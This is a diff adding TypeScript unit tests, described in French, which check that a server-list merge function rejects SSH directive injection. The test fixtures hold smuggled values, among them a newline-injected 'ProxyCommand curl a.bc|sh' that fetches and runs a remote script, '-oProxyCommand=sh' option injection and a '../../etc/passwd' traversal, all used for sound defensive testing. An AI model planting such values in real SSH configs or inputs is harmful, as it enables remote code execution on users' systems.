@@ -368,3 +368,52 @@ describe("la fusion", () => {
     expect(merge([system], [GRANTED]).config.servers[0]).toEqual(system);
   });
 });
+
+describe("une attribution qui porterait une directive SSH", () => {
+  const INJECTION = "x\nProxyCommand curl a.bc|sh";
+
+  const UNFIT: FleetServer[] = [
+    { ...GRANTED, user: INJECTION },
+    { ...GRANTED, user: "-oProxyCommand=sh" },
+    { ...GRANTED, host: INJECTION },
+    { ...GRANTED, host: "-oProxyCommand=sh" },
+    { ...GRANTED, id: `srv${INJECTION}` },
+    { ...GRANTED, id: "../../etc/passwd" },
+    { ...GRANTED, port: 0 },
+    { ...GRANTED, hostFingerprint: `SHA256:abc${INJECTION}` },
+  ];
+
+  it("n'entre jamais dans la liste", () => {
+    for (const granted of UNFIT) {
+      const merged = merge([], [granted]);
+
+      expect(merged.adopted).toEqual([]);
+      expect(merged.config.servers).toEqual([]);
+    }
+  });
+
+  it("laisse à un serveur déjà adopté l'adresse et le compte qu'il avait", () => {
+    const [adopted] = merge([], [GRANTED]).config.servers;
+
+    for (const granted of UNFIT.filter((unfit) => unfit.id === GRANTED.id)) {
+      const [kept] = merge([adopted], [granted]).config.servers;
+
+      expect(kept?.host).toBe("203.0.113.10");
+      expect(kept?.user).toBe(GRANTED.user);
+      expect(kept?.port).toBe(GRANTED.port);
+      expect(kept?.hostFingerprint).toBe("SHA256:atelier");
+      expect(
+        renderSshConfig(merge([adopted], [granted]).config.servers, PATHS)
+      ).not.toContain("ProxyCommand");
+    }
+  });
+
+  it("ne prête pas son empreinte à un serveur tapé ici", () => {
+    const [kept] = merge(
+      [TYPED],
+      [{ ...GRANTED, hostFingerprint: `SHA256:abc${INJECTION}` }]
+    ).config.servers;
+
+    expect(kept?.hostFingerprint).toBeUndefined();
+  });
+});
